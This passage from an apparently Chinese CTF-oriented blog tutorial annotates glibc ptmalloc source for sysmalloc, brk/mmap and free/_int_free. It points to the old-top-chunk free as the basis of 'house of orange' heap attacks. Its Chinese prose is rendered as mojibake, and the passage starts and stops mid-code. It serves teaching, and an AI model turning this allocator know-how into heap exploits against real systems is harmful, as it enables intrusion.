class="keyword">sizeof</span>(*heap));</span><br><span class="line">      set_head(top(av), (heap-&gt;size - <span class="keyword">sizeof</span>(*heap)) | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Setup fencepost and free the old top chunk. */</span></span><br><span class="line">      <span class="comment">/* The fencepost takes at least MINSIZE bytes, because it might</span></span><br><span class="line"><span class="comment">	 become the top chunk again later.  Note that a footer is set</span></span><br><span class="line"><span class="comment">	 up, too, although the chunk is marked in use. */</span></span><br><span class="line">      old_size -= MINSIZE;</span><br><span class="line">      set_head(chunk_at_offset(old_top, old_size + <span class="number">2</span>*SIZE_SZ), <span class="number">0</span>|PREV_INUSE);</span><br><span class="line">      <span class="keyword">if</span> (old_size &gt;= MINSIZE) &#123;</span><br><span class="line">	set_head(chunk_at_offset(old_top, old_size), (<span class="number">2</span>*SIZE_SZ)|PREV_INUSE);</span><br><span class="line">	set_foot(chunk_at_offset(old_top, old_size), (<span class="number">2</span>*SIZE_SZ));</span><br><span class="line">	set_head(old_top, old_size|PREV_INUSE|NON_MAIN_ARENA);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> ATOMIC_FASTBINS</span></span><br><span class="line">	_int_free(av, old_top, <span class="number">1</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	_int_free(av, old_top);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	set_head(old_top, (old_size + <span class="number">2</span>*SIZE_SZ)|PREV_INUSE);</span><br><span class="line">	set_foot(old_top, (old_size + <span class="number">2</span>*SIZE_SZ));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!tried_mmap)   <span class="comment">// æ£€æŸ¥æ˜¯å¦è¿˜èƒ½ä½¿ç”¨ mmap</span></span><br><span class="line">      <span class="comment">/* We can at least try to use to mmap memory.  */</span></span><br><span class="line">      <span class="keyword">goto</span> try_mmap;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>å¦‚æœå½“å‰çº¿ç¨‹çš„åˆ†é…åŒºä¸æ˜¯ä¸»åˆ†é…åŒºï¼Œä¼šå…ˆå°è¯•æ‹“å±•å½“å‰çš„ heapï¼Œé€šè¿‡è°ƒæ•´ sub_heap çš„è¾¹ç•Œå°è¯•è·å–æ›´å¤šçš„ç©ºé—´ï¼Œå¦‚æœå¤±è´¥ï¼Œå°±ä¼šå°è¯•æ–°å»ºä¸€ä¸ª heap(ä½¿ç”¨ brk() æ‹“å±•) ï¼Œåœ¨æ–°å»º heap çš„ä»£ç ä¸­ï¼Œå’Œ pwn é¢˜æœ‰å…³ç³»çš„å°±æ˜¯ __int_free(av, old_top)ï¼Œè¿™å¥ä»£ç ï¼Œå› ä¸ºå®ƒä¼šå°†æ—§çš„ top chunk åŠ å…¥åˆ° unsortedbin ä¸­ï¼Œè¿™ä¹Ÿæ˜¯ house of orange ä»¥åŠä¸€ç³»åˆ—è¡ç”Ÿæ”»å‡»çš„åŸºç¡€ã€‚</p>
<p><strong>æ³¨æ„ï¼ ä¸‹é¢çš„ä»£ç ä» sYSMALLOc å°¾éƒ¨å–å¾—</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* if (av !=  &amp;main_arena) */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)av-&gt;system_mem &gt; (<span class="type">unsigned</span> <span class="type">long</span>)(av-&gt;max_system_mem))</span><br><span class="line">    av-&gt;max_system_mem = av-&gt;system_mem;</span><br><span class="line">  check_malloc_state(av);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* finally, do the allocation */</span></span><br><span class="line">  p = av-&gt;top;</span><br><span class="line">  size = chunksize(p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* check that one of the above allocation paths succeeded */</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>)(nb + MINSIZE)) &#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder = chunk_at_offset(p, nb);</span><br><span class="line">    av-&gt;top = remainder;</span><br><span class="line">    set_head(p, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">    check_malloced_chunk(av, p, nb);</span><br><span class="line">    <span class="keyword">return</span> chunk2mem(p);    <span class="comment">// è¿”å›å †å—</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>æ‹“å±•å‡ºæ–°çš„ heap ä¹‹åå°±å¯ä»¥åˆ‡å‰²å‡ºæ»¡è¶³è¦æ±‚çš„å †å—äº†ã€‚</p>
<p>å¦‚æœæ‹“å±• topchunk æˆ–è€…æ˜¯ åˆ†é…æ–°çš„ heap éƒ½å¤±è´¥äº†ï¼Œå°±ä¼šæ£€æŸ¥æ˜¯å¦å°è¯•è¿‡ mmapï¼Œå¦‚æœæ²¡æœ‰ï¼Œå°±ä¼šè·³è½¬åˆ° mmap éƒ¨åˆ†å°è¯•æ˜ å°„ä¸€å—å†…å­˜ã€‚</p>
<p>å¦‚æœå½“å‰åˆ†é…åŒºå±äºä¸»åˆ†é…åŒºï¼Œé‚£ä¹ˆæƒ…å†µè¦å¤æ‚å¾ˆå¤šï¼Œä¸è¿‡æœ€åçš„æ•ˆæœæ˜¯å·®ä¸å¤šçš„ï¼Œè€Œä¸”è¿™æ®µä»£ç å’Œ pwn é¢˜å…³è”å¹¶ä¸æ˜¯å¾ˆå¤§ï¼Œæƒ³è¦è¯¦ç»†äº†è§£çš„åŒå­¦å¯ä»¥è‡ªè¡Œåˆ†æä¸€ä¸‹ glibc çš„æºä»£ç ã€‚</p>
<p>sYSMALLOc çš„æ‰§è¡Œæµç¨‹å¯ä»¥å‚è€ƒä¸‹é¢è¿™å¼ å›¾ç‰‡(çœç•¥äº†åœ¨ä¸»åˆ†é…åŒºçš„æƒ…å†µ)</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/malloc_free_9.png"
                      alt="malloc_free_9.png"
                ></p>
<h2 id="malloc-å‡ ä¸ªç»†èŠ‚"><a href="#malloc-å‡ ä¸ªç»†èŠ‚" class="headerlink" title="malloc å‡ ä¸ªç»†èŠ‚"></a>malloc å‡ ä¸ªç»†èŠ‚</h2><p>malloc è¿˜æœ‰å‡ ä¸ªç»†èŠ‚ï¼Œåœ¨è¿™é‡Œç¨ä½œè§£é‡Šã€‚</p>
<ol>
<li>ç‰©ç†å†…å­˜åˆ†é…æ—¶é—´ã€‚ä¸Šä¸€ç¯‡æ–‡ç« æåˆ°è°ƒç”¨ malloc å¹¶ä¸ä¼šç«‹å³åœ¨ç‰©ç†é¡µé¢ä¸Šåˆ›å»ºç›¸åº”çš„å †å—ï¼Œè€Œæ˜¯å½“ç”¨æˆ·çœŸæ­£ä½¿ç”¨è¿™å—ç©ºé—´çš„æ—¶å€™æ‰ä¼šåˆ›å»ºï¼Œè¿™æ˜¯ç”±äº malloc ç»™ç¨‹åºåˆ†é…çš„æ˜¯è™šæ‹Ÿåœ°å€ï¼Œå½“ç¨‹åºè®¿é—®è¿™ä¸ªè™šæ‹Ÿåœ°å€çš„æ—¶å€™ï¼ŒMMU å‘ç°è™šæ‹Ÿåœ°å€æ²¡æœ‰å¯¹åº”çš„ç‰©ç†å†…å­˜ï¼Œè§¦å‘é¡µä¸­æ–­ï¼Œè¿™æ—¶å€™ç¡¬ä»¶ä¼šé™·å…¥å†…æ ¸å¤„ç†ä¸­æ–­ï¼Œæ“ä½œç³»ç»Ÿè´Ÿè´£åˆ†é…ç‰©ç†å†…å­˜ï¼ŒMMU å†å°†è™šæ‹Ÿåœ°å€ç»‘å®šåˆ°ç‰©ç†å†…å­˜ä¸Šé¢ï¼Œå®Œæˆå†…å­˜åˆ†é…æ“ä½œã€‚</li>
<li>MMUï¼š è‹±æ–‡ Memory Management Unit å†…å­˜ç®¡ç†å•å…ƒï¼Œè¿™ä¸ªæ¨¡å—ä¸€èˆ¬éƒ½è¢«é›†æˆåœ¨ CPU ä¸­ï¼ŒCPU å‘å‡ºçš„æ˜¯è™šæ‹Ÿåœ°å€(ä¾‹å¦‚è°ƒè¯•çš„æ—¶å€™ç»å¸¸çœ‹åˆ°çš„ 0x400000 ç­‰)ï¼Œæ­£å¸¸æƒ…å†µä¸‹è¿™ä¸ªå¦‚æœä½¿ç”¨è¿™ä¸ªåœ°å€å»å¯»æ‰¾å†…å­˜çš„è¯æ˜¯æ‰¾ä¸åˆ°çš„ï¼Œéœ€è¦å…ˆç»è¿‡ MMU å°†è™šæ‹Ÿåœ°å€è½¬æ¢æˆç‰©ç†å†…å­˜åœ°å€æ‰èƒ½æ­£å¸¸å¯»å€ã€‚</li>
</ol>
<p>ç®€å•ç†è§£ brk ä¸ mmapï¼š</p>
<p>è¿™ä¸¤ä¸ªå±äºåº•å±‚çš„ç³»ç»Ÿè°ƒç”¨ï¼Œmalloc å°±æ˜¯ä¾é å®ƒä»¬å®Œæˆå†…å­˜åˆ†é…çš„ï¼Œbrk åœ¨åŸæœ‰çš„ heap åŸºç¡€ä¸Šè¿›è¡Œæ‹“å±•ï¼Œè€Œ mmap å°è¯•åœ¨å †æ ˆä¹‹é—´æ‰¾ä¸€å—å†…å­˜ã€‚</p>
<p>ä»¥ä¸‹å›¾ä¸ºä¾‹ï¼Œè¿™æ˜¯ä¸€ä¸ªç®€å•çš„å†…å­˜æ¨¡å‹</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/malloc_free_10.png"
                      alt="malloc_free_10.png"
                ></p>
<p>å¦‚æœç”¨æˆ·ç”³è¯·äº†ä¸€å—æ¯”è¾ƒå¤§çš„å†…å­˜ï¼Œå½“å‰ top chunk å¤§å°ä¸è¶³ä»¥å®¹çº³(å¹¶ä¸”æ²¡æœ‰è¶…è¿‡ mmap çš„é˜ˆå€¼)ï¼Œå°±ä¼šè°ƒç”¨ sYSMALLOc å°è¯•æ‹“å±•å½“å‰ heapã€‚è¿™é‡Œè¦ä»‹ç»ä¸€ä¸ªæŒ‡é’ˆ _edateï¼Œå®ƒè¢«å®šä¹‰åœ¨ glibc ä¸­ï¼ŒæŒ‡å‘å½“å‰è¿›ç¨‹æ•°æ®æ®µçš„æœ€é«˜åœ°å€ï¼Œå½“æ‹“å±• heap çš„æ—¶å€™ï¼Œä¼šè°ƒ brk è¿™ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œä¾‹å¦‚è¿ç»­åˆ†é…ä¸¤ä¸ªå¤§å°ä¸º 0x7800 çš„å †å—ï¼Œè°ƒç”¨ brk ä¹‹åå¦‚å›¾</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/malloc_free_11.png"
                      alt="malloc_free_11.png"
                ></p>
<p>æ‰€ä»¥ brk çš„å¤§è‡´åŸç†å°±æ˜¯æŠ¬é«˜ _edata æŒ‡é’ˆï¼Œæ¥æ‹“å±•å½“å‰çš„ heapã€‚</p>
<p>å½“ç”¨æˆ·ç”³è¯·çš„ chunk å¤§å°è¶…è¿‡ mmap é˜ˆå€¼ï¼Œä¼šç›´æ¥è°ƒç”¨ mmap æ¥åˆ†é…å †å—ï¼Œä¾‹å¦‚ç”³è¯·ä¸€ä¸ªå¤§å°ä¸º 0x22000 çš„å †å—ï¼Œmmap ä¹‹åå¦‚å›¾<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/malloc_free_12.png"
                      alt="malloc_free_12.png"
                ></p>
<p>free çš„æ—¶å€™ä¹Ÿæ˜¯ä¸€æ ·ï¼Œå¦‚æœ free mmap çš„åŒºåŸŸï¼Œptmalloc ä¼šç›´æ¥å°†å†…å­˜è¿”å›ç»™ç³»ç»Ÿï¼Œä½†æ˜¯å½“ free chunk1 çš„æ—¶å€™ï¼Œç”±äº _edata æŒ‡é’ˆæŒ‡å‘æ•°æ®æ®µçš„æœ€é«˜åœ°å€ï¼Œè€Œæœ€é«˜åœ°å€è¿˜æœ‰ä¸€ä¸ª chunk2 æ­£åœ¨è¢«ä½¿ç”¨ï¼Œè¿™æ—¶ä¸èƒ½æ”¶ç¼©å †ã€‚è€Œå½“ chunk2 ä¹Ÿè¢« free ä¹‹åï¼Œ1 2 ä¸¤ä¸ª chunk ä¼šè‡ªåŠ¨åˆå¹¶ï¼Œ_edata æŒ‡é’ˆä¹Ÿå°±å¯ä»¥æ”¶ç¼©äº†ï¼Œchunk1 å’Œ 2 ç»„æˆçš„ä¸€å—å†…å­˜ä¼šè¢«å½’è¿˜æ“ä½œç³»ç»Ÿã€‚</p>
<h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><p>å‰é¢åˆ†æäº† malloc ä»¥åŠå‡ ä¸ªé™„åŠ å‡½æ•°ï¼Œä¸‹é¢å°±è¦è¿›å…¥åˆ° free å‡½æ•°äº†ã€‚</p>
<p>æ“ä½œç³»ç»Ÿçš„å†…å­˜ä¸æ˜¯æ— é™çš„ï¼Œç¨‹åºä½¿ç”¨ malloc å‘æ“ä½œç³»ç»Ÿç”³è¯·å†…å­˜ï¼Œä¸èƒ½ä¸€ç›´å æ®ä¸æ”¾ï¼Œå½“è¿™äº›å†…å­˜ä¸å†ä½¿ç”¨çš„æ—¶å€™ï¼Œéœ€è¦ä½¿ç”¨ free å‡½æ•°è¿›è¡Œé‡Šæ”¾ï¼Œä»¥ä¿è¯æ•´ä¸ªç³»ç»Ÿçš„æ­£å¸¸è¿è¡Œã€‚</p>
<p>ç®€å•çš„ç†è§£ä¸€ä¸‹ï¼Œfree å‡½æ•°æ‰€æ‰§è¡Œçš„æ“ä½œå…¶å®å¯ä»¥è§†ä¸º malloc å‡½æ•°çš„é€†è¿‡ç¨‹ï¼Œmalloc ä»ç¼“å†²åŒºæˆ–è€…æ“ä½œç³»ç»Ÿä¸­æ‹¿å–ç©ºé—´ï¼Œè€Œ free åˆ™è´Ÿè´£å°†è¿™äº›ç©ºé—´æ”¾å›ç¼“å†²åŒºæˆ–è€…æ“ä½œç³»ç»Ÿã€‚</p>
<h2 id="public-fREe"><a href="#public-fREe" class="headerlink" title="public_fREe"></a>public_fREe</h2><p>æ­¤å‡½æ•°æ˜¯ free çš„å¤–å£³å‡½æ•°ï¼Œæ‰€å¤„ç†çš„é—®é¢˜å’Œå¤šçº¿ç¨‹æœ‰å…³ï¼Œfree çš„æ ¸å¿ƒå‡½æ•°æ˜¯ __int_free</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">public_fREe</span><span class="params">(Void_t* mem)</span></span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> (*hook) (<span class="type">__malloc_ptr_t</span>, __const <span class="type">__malloc_ptr_t</span>)</span><br><span class="line">    = force_reg (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">    (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  p = mem2chunk(mem);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> HAVE_MMAP</span></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped(p))                       <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span></span><br><span class="line">    <span class="keyword">if</span> (!mp_.no_dyn_threshold</span><br><span class="line">	&amp;&amp; p-&gt;size &gt; mp_.mmap_threshold</span><br><span class="line">	&amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)</span><br><span class="line">      &#123;</span><br><span class="line">	mp_.mmap_threshold = chunksize (p);</span><br><span class="line">	mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">      &#125;</span><br><span class="line">    munmap_chunk(p);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  ar_ptr = arena_for_chunk(p);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> ATOMIC_FASTBINS</span></span><br><span class="line">  _int_free(ar_ptr, p, <span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">if</span> THREAD_STATS</span></span><br><span class="line">  <span class="keyword">if</span>(!mutex_trylock(&amp;ar_ptr-&gt;mutex))</span><br><span class="line">    ++(ar_ptr-&gt;stat_lock_direct);</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    (<span class="type">void</span>)mutex_lock(&amp;ar_ptr-&gt;mutex);</span><br><span class="line">    ++(ar_ptr-&gt;stat_lock_wait);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">  (<span class="type">void</span>)mutex_lock(&amp;ar_ptr-&gt;mutex);</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">  _int_free(ar_ptr, p);</span><br><span class="line">  (<span class="type">void</span>)mutex_unlock(&amp;ar_ptr-&gt;mutex);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="int-free"><a href="#int-free" class="headerlink" title="__int_free"></a>__int_free</h2><p>å’Œ malloc ä¸€æ ·ï¼Œfree å‡½æ•°çš„æ ¸å¿ƒä»£ç æ˜¯ __int_freeï¼Œå¯ä»¥åœ¨ malloc.c ä¸­æ‰¾åˆ°ã€‚</p>
<p>å‡½æ•°å¼€å¤´é¦–å…ˆå®šä¹‰äº†ä¸€äº›å±€éƒ¨å˜é‡ï¼Œæ‘˜å½•å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> ATOMIC_FASTBINS</span></span><br><span class="line">_int_free(mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">_int_free(mstate av, mchunkptr p)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T size;        <span class="comment">/* its size */</span></span><br><span class="line">  mfastbinptr*    fb;          <span class="comment">/* associated fastbin */</span></span><br><span class="line">  mchunkptr       nextchunk;   <span class="comment">/* next contiguous chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T nextsize;    <span class="comment">/* its size */</span></span><br><span class="line">  <span class="type">int</span>             nextinuse;   <span class="comment">/* true if nextchunk is used */</span></span><br><span class="line">  INTERNAL_SIZE_T prevsize;    <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line">  mchunkptr       bck;         <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr       fwd;         <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *errstr = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> ATOMIC_FASTBINS</span></span><br><span class="line">  <span class="type">int</span> locked = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    </span><br><span class="line">  size = chunksize(p);</span><br></pre></td></tr></table></figure></div>

<p>ä¾æ—§æ˜¯é‚£äº›å¾ˆå¸¸ç”¨çš„å˜é‡ï¼Œè¿™é‡Œå°±ä¸è¯¦ç»†ä»‹ç»äº†ã€‚</p>
<p>__int_free å‡½æ•°ä¸»è¦æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œä¸€æ˜¯æŒ‡å‘ arena çš„æŒ‡é’ˆ avï¼ŒäºŒæ˜¯ä¼ å…¥çš„ chunk æŒ‡é’ˆï¼Œä»£ç é¦–å…ˆä½¿ç”¨ chunksize è®¡ç®—å‡ºå½“å‰ chunk çš„å¤§å°ï¼Œç„¶åæ˜¯ä¸€äº›å®‰å…¨æ£€æŸ¥</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Little security check which won&#x27;t hurt performance: the</span></span><br><span class="line"><span class="comment">     allocator never wrapps around at the end of the address space.</span></span><br><span class="line"><span class="comment">     Therefore we can exclude some size values which might appear</span></span><br><span class="line"><span class="comment">     here by accident or by &quot;design&quot; from some intruder.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="type">uintptr_t</span>) p &gt; (<span class="type">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">&quot;free(): invalid pointer&quot;</span>;</span><br><span class="line">    errout:</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> ATOMIC_FASTBINS</span></span><br><span class="line">      <span class="keyword">if</span> (! have_lock &amp;&amp; locked)</span><br><span class="line">	(<span class="type">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      malloc_printerr (check_action, errstr, chunk2mem(p));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* We know that each chunk is at least MINSIZE bytes in size.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (size &lt; MINSIZE, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">&quot;free(): invalid size&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">  check_inuse_chunk(av, p);</span><br></pre></td></tr></table></figure></div>

<p>è¿™æ®µä»£ç æ£€æŸ¥äº† chunk çš„ size æ˜¯å¦å‘ç”Ÿäº†æº¢å‡ºï¼Œå †å—çš„åœ°å€è¦å¯¹é½ï¼Œå¹¶ä¸”å †å—çš„ size ä¸èƒ½å°äºæœ€å°å€¼ã€‚</p>
<p>æ¥ä¸‹æ¥ä¼šé¦–å…ˆåˆ¤æ–­å½“å‰ chunk æ˜¯å¦å±äº fastbinï¼Œå› ä¸º fastbin æ˜¯åˆ†é…é€Ÿåº¦æœ€å¿«çš„ç¼“å†²åŒº</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    If eligible, place chunk on a fastbin so it can be found</span></span><br><span class="line"><span class="comment">    and used quickly in malloc.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>)(get_max_fast ())  <span class="comment">// åˆ¤æ–­ chunk çš„ size æ˜¯å¦å±äº fastbin èŒƒå›´å†…</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> TRIM_FASTBINS</span></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">	If TRIM_FASTBINS set, don&#x27;t place chunks</span></span><br><span class="line"><span class="comment">	bordering top into fastbins</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">	|| __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">			     &gt;= av-&gt;system_mem, <span class="number">0</span>)) <span class="comment">// å®‰å…¨æ£€æŸ¥ï¼Œå½“å‰ chunk çš„ next chunk size ä¸èƒ½å°äº 2 * SIZE_SZï¼Œå¹¶ä¸”ä¸èƒ½å¤§äºæ­¤æ—¶çš„å†…å­˜åˆ†é…æ€»é‡ã€‚</span></span><br><span class="line">      &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> ATOMIC_FASTBINS</span></span><br><span class="line">	<span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">	   of system_mem might have let to a false positive.  Redo the test</span></span><br><span class="line"><span class="comment">	   after getting the lock.  */</span></span><br><span class="line">	<span class="keyword">if</span> (have_lock</span><br><span class="line">	    || (&#123; assert (locked == <span class="number">0</span>);</span><br><span class="line">		  mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">		  locked = <span class="number">1</span>;</span><br><span class="line">		  chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">		    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">	      &#125;))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	  &#123;</span><br><span class="line">	    errstr = <span class="string">&quot;free(): invalid next size (fast)&quot;</span>;</span><br><span class="line">	    <span class="keyword">goto</span> errout;</span><br><span class="line">	  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> ATOMIC_FASTBINS</span></span><br><span class="line">	<span class="keyword">if</span> (! have_lock)</span><br><span class="line">	  &#123;</span><br><span class="line">	    (<span class="type">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">	    locked = <span class="number">0</span>;</span><br><span class="line">	  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">      free_perturb (chunk2mem(p), size - SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    set_fastchunks(av);    <span class="comment">// å°† chunk çš„æ ‡å¿—ä½ç½®ä½</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index(size);    <span class="comment">// è®¡ç®—å½“å‰ chunk åœ¨é“¾è¡¨ä¸­çš„ index</span></span><br><span class="line">    fb = &amp;fastbin (av, idx);   <span class="comment">// æ ¹æ® index è·å–é“¾è¡¨å¤´ç»“ç‚¹æŒ‡é’ˆ</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> ATOMIC_FASTBINS</span></span><br><span class="line">    mchunkptr fd;</span><br><span class="line">    mchunkptr old = *fb;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">	<span class="comment">/* Another simple check: make sure the top of the bin is not the</span></span><br><span class="line"><span class="comment">	   record we are going to add (i.e., double free).  */</span></span><br><span class="line">	<span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">	  &#123;</span><br><span class="line">	    errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">	    <span class="keyword">goto</span> errout;</span><br><span class="line">	  &#125;</span><br><span class="line">	<span class="keyword">if</span> (old != <span class="literal">NULL</span>)</span><br><span class="line">	  old_idx = fastbin_index(chunksize(old));</span><br><span class="line">	p-&gt;fd = fd = old;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, fd)) != fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fd != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">	errstr = <span class="string">&quot;invalid fastbin entry (free)&quot;</span>;</span><br><span class="line">	<span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="comment">/* Another simple check: make sure the top of the bin is not the</span></span><br><span class="line"><span class="comment">       record we are going to add (i.e., double free).  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (*fb == p, <span class="number">0</span>))    <span class="comment">// å½“å‰é“¾è¡¨çš„ç¬¬ä¸€ä¸ªå †å—ä¸èƒ½æ˜¯æ­£è¦æ’å…¥çš„å †å—ï¼Œé˜²æ­¢ double free çš„å‘ç”Ÿ</span></span><br><span class="line">      &#123;</span><br><span class="line">	errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">	<span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">    <span 